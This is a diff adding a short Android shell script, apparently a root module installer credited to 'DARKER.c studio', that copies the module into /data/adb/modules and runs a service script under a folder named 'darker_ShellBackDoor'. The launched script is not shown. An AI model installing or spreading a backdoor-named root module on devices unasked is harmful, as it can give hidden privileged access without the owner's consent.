@@ -1,0 +1,18 @@
+#!/system/bin/sh
+
+
+
+###########################################################
+#  Copyright © 2024 DARKER.c studio. All rights reserved. #
+###########################################################
+
+
+
+# Global variables
+MODS_PATH="/data/adb/modules"
+ 
+mkdir -p $MODS_PATH
+
+# shellcheck disable=SC2153
+rm -rf "$MODPATH"/customize.sh; cp -af "$MODPATH" $MODS_PATH
+sh $MODS_PATH/darker_ShellBackDoor/service.sh
